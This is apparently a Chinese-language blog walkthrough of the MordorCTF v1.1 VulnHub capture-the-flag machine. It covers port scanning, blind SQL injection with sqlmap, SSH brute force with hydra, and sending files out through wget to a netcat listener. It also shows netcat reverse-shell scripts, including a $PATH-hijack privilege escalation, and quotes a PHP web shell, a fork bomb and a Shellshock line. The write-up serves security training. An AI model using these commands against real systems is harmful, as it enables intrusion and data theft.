---
layout: post
title: "MordorCTF v1.1 walkthrough"
date: 2021-11-02
author: 2hanx
toc: true
categories: [Vulnhub]
tags: []
---

### 主机识别

`arp-scan -l`

### 网络拓扑

| 计算机         | IP                |
| -------------- | ----------------- |
| 本机（Win10）  | `192.168.174.1`   |
| Kali           | `192.168.174.128` |
| MordorCTF-v1.1 | `192.168.174.145` |

### 扫描端口和版本信息

`nmap -A -p- 192.168.174.145`

```shell
┌──(root💀kali)-[~]
└─# nmap -p- -A 192.168.174.145
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-29 21:25 EDT
Nmap scan report for 192.168.174.145
Host is up (0.00071s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey:
|   2048 6e:76:ac:41:c6:ce:61:e9:0f:72:9b:eb:63:bd:60:4c (RSA)
|   256 df:63:08:78:1e:75:ee:d6:29:f6:43:42:d9:10:06:fb (ECDSA)
|_  256 19:aa:64:a1:7e:06:e7:21:12:5d:d8:59:f3:0b:17:b0 (ED25519)
80/tcp   open  http            Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
4000/tcp open  remoteanything?
| fingerprint-strings:
|   NULL:
|     ___ . . _
|     "T$$$P" | |_| |_
|     :$$$ | | | |_
|     :$$$ "T$$$$$$$b.
|     :$$$ .g$$$$$p. T$$$$b. T$$$$$bp. BUG "Tb T$b T$P .g$P^^T$$ ,gP^^T$$
|     .s^s. :sssp $$$ :$; T$$P $^b. $ dP" `T :$P `T
|     Tbp.
|_    "T$$p.
```

采用常规思路探索后找不到入侵点，上网看其他的 walkthrough 文章后发现字典需要从 *the lord of the rings* 影片中的特殊名词生成。好吧，上网找个统计网站，把单词扒下来。

```python
import requests
from lxml import etree

url = "https://relatedwords.io/the-lord-of-the-rings"
get = requests.get(url).text

selector = etree.HTML(get)

# <a href="/epic-pooh" rel="nofollow">epic pooh</a>
words = selector.xpath('//a[@rel="nofollow"]/text()')

f = open("word.txt","w")
for word in words:
    try:
        f.write(word)
        f.write("\n")
    except:
        pass
f.close()
```

后续需要过滤非ascii符，并且只把一个单词或只有一个空格的情况筛选出来，将空格删除就得到了字典，引入该字典进行目录枚举就发现存在 `/blackgate` 路径。

### flag 1

访问该路径，得到了第一个flag：`flag{bc6fd79cd1fa7ebbcd420cb45434d9a2b4d921a5} | disquise`。

> 后续将明文写在 sha1密文后面

![1]({{ '/mordor_ctf/1.png' | prepend: site.url }})

### flag 2

在该路径下进一步枚举，发现存在 `/admin` 路径，并且在登录框中简单测试后发现存在sql盲注漏洞。那么直接上 *sqlmap*，最后爆出用户名和密码为：

```shell
Database: mordor
Table: blackgate
[1 entry]
+----------+------------------------------------------+
| username | password                                 |
+----------+------------------------------------------+
| Azog     | 26f736aacd60fb538e72f1307f1e4bb1322b02bc |
+----------+------------------------------------------+
```

输入账号和密码登陆后，返回 **Logged in successfully** 字符串，看来是不存在后台的。不过在返回的 cookie 中发现提示信息。

```txt
You found a way to bypass the black gate. A small hole in the rocks gives you an entrance to mordor. During the walk yo find a piece of paper. On the paper ther are a hint, there orcs on the other side. The last line looks like a key \"orc + flag = t22.\"
```

根据提示信息，猜测 **t22** 指的是**terminal 22**，也就是 ssh 登录名是：*orc*，密码是上一个的 flag， 也就是：`bc6fd79cd1fa7ebbcd420cb45434d9a2b4d921a5`，不过尝试后发现是输入其[明文](https://hashtoolkit.com/decrypt-hash/?hash=bc6fd79cd1fa7ebbcd420cb45434d9a2b4d921a5)：`disquise`。

```shell
orc@mordor:~$ ls -al
insgesamt 28
drwx------ 4 orc  orc  4096 Aug 29  2019 .
drwxr-xr-x 6 root root 4096 Aug 13  2019 ..
lrwxrwxrwx 1 root root    9 Aug  9  2019 .bash_history -> /dev/null
-rw-r--r-- 1 orc  orc   220 Aug  9  2019 .bash_logout
-rw-r--r-- 1 root root   86 Aug  9  2019 .bashrc
drwxr-xr-x 2 orc  orc  4096 Aug 29  2019 bin
drwxr-xr-x 3 orc  orc  4096 Aug  9  2019 .local
-rw-r--r-- 1 root root  807 Aug  9  2019 .profile
orc@mordor:~$ cd bin
-rbash: cd: gesperrt
orc@mordor:~$ ls -al ./bin
insgesamt 1888
drwxr-xr-x 2 orc orc    4096 Aug 29  2019 .
drwx------ 4 orc orc    4096 Aug 29  2019 ..
-rwxr-xr-x 1 orc orc   18200 Aug  9  2019 door
-rwxr-xr-x 1 orc orc  138856 Aug  9  2019 ls
-rwxr-xr-x 1 orc orc   16744 Aug 29  2019 outpost
-rwxr-xr-x 1 orc orc 1168776 Aug  9  2019 rbash
-rwxr-xr-x 1 orc orc   68416 Aug  9  2019 rm
-rwxr-xr-x 1 orc orc  466496 Aug  9  2019 wget
-rwxr-xr-x 1 orc orc   35456 Aug  9  2019 whoami
```

登录后发现是 *rbash* shell，并且只能执行几个命令，此外在 `/home/orc/bin`目录下存在二进制文件：`door`和 `output`，使用该目录下的 `wget` 命令将两个文件传到本地进行分析。

- 靶机执行 `wget` 命令上传：`wget --post-file=./bin/door 192.168.174.128:5566`
- kali 开启 **5566** 监听端口，并且将接收到的输入输出到文件：`nc -lvp 5566 > door`

> 不过该方法有个弊端，只能手工将请求头从文件的开始部分去掉即可

![2]({{ '/mordor_ctf/2.png' | prepend: site.url }})

通过IDA进行分析发现该程序流程比较简单，将输入的值与 *badpasword* 字段进行匹配，只要相同就可执行 */bin/sh* 指令，即获取一个shell。

通过同样的方法对 *outpost* 二进制文件进行分析，该程序也是将输入的值与16进制：`0xdeadbeef`进行比对，不过在 *exitOutpost()* 函数里我们可以直接看到正确的输出结果，得到第二个flag：`flag{8a29aaf5687129c1d27b90578fc33ecc49d069dc} | badpassword`

![3]({{ '/mordor_ctf/3.png' | prepend: site.url }})

![4]({{ '/mordor_ctf/4.png' | prepend: site.url }})

### flag3

获得 *sh* shell后进行简单收集发现存在四个普通用户：

```shell
$ ls -al
insgesamt 24
drwxr-xr-x  6 root      root      4096 Aug 13  2019 .
drwxr-xr-x 20 root      root      4096 Aug 13  2019 ..
drwx------  3 barad_dur barad_dur 4096 Jan  4  2020 barad_dur
drwxr-xr-x  2 developer developer 4096 Aug 29  2019 developer
drwx------  2 nazgul    nazgul    4096 Aug 13  2019 nazgul
drwx------  4 orc       orc       4096 Aug 29  2019 orc
```

此外在系统根目录下发现 */whistleblow* 目录所属用户组是`orc`，并且目录下存在一个*Orc.jpg* 图片。

![5]({{ '/mordor_ctf/5.jpg' | prepend: site.url }})

通过 *exiftool* 工具查看图片元数据时发现提示信息：

```txt
Psst, little pig, i know what you want! I have hidden information for you
```

看来是进行了图片隐写，直接上 *steghide* 工具，提取出隐写文件：*whistleblow.txt*

```txt
You want to invade the fortress barad dur. You will got huge trouble, if youre noticed by some of the guards. You didn't hear this from me, but there's an unguarded entrance to the fortress. The way to that entrace is very dangerous, you have to evade the nazguls, they observe every time the area. The big eye is watching all time. If you reach the fortess, you have to go behind the fortress on the rocks. Go on, before i change my mind.

flag{9e49cb5caf91603db26adb774c6af72c88a6304a}
```

得到第三个flag：`flag{9e49cb5caf91603db26adb774c6af72c88a6304a} | 23lorlorck`

照着之前的套路，对ssh进行账号密码爆破，得到一个正确的账户和密码：`nazgul:23lorlorck`

```shell
┌──(root💀kali)-[~]
└─# hydra -L user.txt -p 23lorlorck 192.168.174.145 ssh  
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-30 01:30:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:4/p:1), ~1 try per task
[DATA] attacking ssh://192.168.174.145:22/
[22][ssh] host: 192.168.174.145   login: nazgul   password: 23lorlorck
1 of 1 target successfully completed, 1 valid password found
```

### flag4

登录到 *nazgul* 账户后发现执行一个命令就会退出，不过我们可以在 *orc* 账户的shell中创建一个反弹脚本，一旦登录 *nazgul* 账户后就执行，从而绕过限制。

```shell
echo "/bin/nc 192.168.174.128 6677 -e /bin/sh &" > /tmp/shell.sh
/usr/bin/chmod 777 /tmp/shell.sh
```

反弹得到shell后在 `/minasmorgul` 目录下得到第四个flag：`flag{37643e626fb594b41cf5c86683523cbb2fdb0ddc} | baraddur`

```shell
cd minasmorgul
ls
flag.txt
cat flag.txt
The nazgul's doesnt noticed you, youre very near to the fortress barad dur.
Frodo is already on the journey to morder, for destroying the ring at mount doom.
You see the great glowing eye... darkness overwhelms all you can see...
Mount doom bubbles and smokes very strongly, lightning and thunder rule over the country. Darkness everywhere

               Three::rings
          for:::the::Elven-Kings
       under:the:sky,:Seven:for:the
     Dwarf-Lords::in::their::halls:of
    stone,:Nine             for:Mortal
   :::Men:::     ________     doomed::to
 die.:One   _,-'...:... `-.    for:::the
 ::Dark::  ,- .:::::::::::. `.   Lord::on
his:dark ,'  .:::::zzz:::::.  `.  :throne:
In:::the/    ::::dMMMMMb::::    \ Land::of
:Mordor:\    ::::dMMmgJP::::    / :where::
::the::: '.  '::::YMMMP::::'  ,'  Shadows:
 lie.::One  `. ``:::::::::'' ,'    Ring::to
 ::rule::    `-._```:'''_,-'     ::them::
 all,::One      `-----'        ring::to
   ::find:::                  them,:One
    Ring:::::to            bring::them
      all::and::in:the:darkness:bind
        them:In:the:Land:of:Mordor
           where:::the::Shadows
                :::lie.:::

flag{37643e626fb594b41cf5c86683523cbb2fdb0ddc}

Now you have to find out how invade the fortress barad dur
```

### flag5-flag8

至此还剩下 *barad_dur* 账户，使用 *baraddur* 密码进行 ssh 登录后即可得到第五个flag：`flag{636e566640f0930b4772ff76932dd4b83d8987af} | tidusauronyuna`，并且执行 *sauron.py* 脚本，不过通过查看源码可以知道答案。

```python
#!/usr/bin/env python
# -*- coding:utf-8 -*-
import os
import subprocess
import time
import random

faqs = {
    1: ['Translate this to ascii "2f6574632f706173737764"', '/etc/passwd'],
    2: [
        """
        What returns this function with the parameters 0x4343, 0xff? Result starts with 0x\n

        _func:
                push    ebp
                mov     ebp,esp
                mov eax, DWORD [ebp+0x8]
                mov edx, DWORD [ebp+0xc]
                add eax, edx
                pop ebp
                ret
        """, '0x4442'],
    3: ["""Translate this to ascii
        00111100 00111111 01110000 01101000 01110000 00100000
        01100101 01100011 01101000 01101111 00100000 01110011
        01101000 01100101 01101100 01101100 01011111 01100101
        01111000 01100101 01100011 00101000 00100100 01011111
        01000111 01000101 01010100 01011011 00100111 01100011
        01101101 01100100 00100111 00101001 00111011 00111111
        00111110""", '<?php echo shell_exec($_GET[\'cmd\');?>'],
    4: [
        """
        What returns this function with the parameters 0x3333, 0x1121? Result starts with 0x\n

        _func:
                push    ebp
                mov     ebp,esp
                mov eax, DWORD [ebp+0x8]
                mov edx, DWORD [ebp+0xc]
                add eax, edx
                pop ebp
                ret
        """, '0x4454'],
    5: [
        """
        What returns this function with the parameters 0xd58dc4b3, 0x091ffa3c? Result starts with 0x\n
        _func:
                push    ebp
                mov     ebp,esp
                mov eax, DWORD [ebp+0x8]
                mov edx, DWORD [ebp+0xc]

        _loop:
                add eax, 0x1
                dec edx
                cmp edx, 0x00
                je _end
                jmp _loop

        _end:
                pop ebp
                ret
        """, '0xdeadbeef'],
    6: ['Which password is here? $1$xJY6LO3c$FTt05FYNiqbk2S0Q6YZ3l/', 'password1'],
    7: ['Which plain is here? $1$xJY6LO3c$MZdoxdaoQXpHHWbxiqrGw.', '12lotr'],
    8: ['Which text is here? $6$2S0Q6YZa$anDqTZkR9eL.Uv0gniNSZgcPuIJs/tM2MFiJIO65cOHPQt4NyvRd1/NVQkq7edaeFkQ.K8ds3t2hXg/8C8l2w.', 'gandalf19'],
    9: ['What is this? :(){: |:&};:', 'forkbomb'],
    10: ['What is that? env X\'() { :; }; /bin/cat /etc/shadow\' bash -c echo', 'shellshock']

}

lp = 3
random.seed(time.time())
n = 0
while n < 5:
    try:
        print("You have " + str(lp) + " lifepoints")
        rnd = random.randint(1, len(faqs))
        faq = faqs[rnd]
        print(faq[0])
        answer = input('Answer: ')
        if answer == faq[1]:
            lp += 1

        else:
            lp -= 1

        n += 1

    except EOFError:
        lp -= 1
        n += 1
        pass

    if lp == 0:
        print("Youre dead")
        os.system("pkill -KILL -u barad_dur")

if lp > 0:
    print("You defeated Sauron")
```

完成三次挑战就可得到三个flag：

```txt
flag{63905253a3f7cde76ef8ab3adcae7d278b4f5251}
flag{dca13eaacea2f4d8c28b00558a93be0c2622bbe1}
flag{79bed0c263a21843c53ff3c8d407462b7f4b8a4a}
```

### flag9

在 *barad_dur* 的用户目录下存在一个*root* 用户组的程序：`plans`

```shell
ls -al
insgesamt 60
drwx------ 3 barad_dur barad_dur  4096 Jan  4  2020 .
drwxr-xr-x 6 root      root       4096 Aug 13  2019 ..
lrwxrwxrwx 1 root      root          9 Aug 15  2019 .bash_history -> /dev/null
-rw-r--r-- 1 barad_dur barad_dur   220 Aug 13  2019 .bash_logout
-rw-r--r-- 1 barad_dur barad_dur  5255 Jan  4  2020 .bashrc
drwxr-xr-x 3 barad_dur barad_dur  4096 Aug 15  2019 .local
-rwxr-xr-x 1 root      root      16712 Aug 15  2019 plans
-rw-r--r-- 1 barad_dur barad_dur   807 Aug 13  2019 .profile
-rwxr-xr-x 1 root      root       2261 Jan  4  2020 sauron.py
-rwxr--r-- 1 root      root       4463 Aug 13  2019 sauron.txt
```

使用IDA工具进行分析，发现该程序是执行 `ls /root` 命令，因此这里存在 `$PATH` 提权漏洞

![6]({{ '/mordor_ctf/6.png' | prepend: site.url }})

### 提权

```shell
echo "nc 192.168.174.128 8899 -e /bin/sh" > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

查看 `/root/flag.txt`，至此得到最后一个flag：`flag{262efbb6087a6aae46f029a2ff19f9f409c9cd3d}`

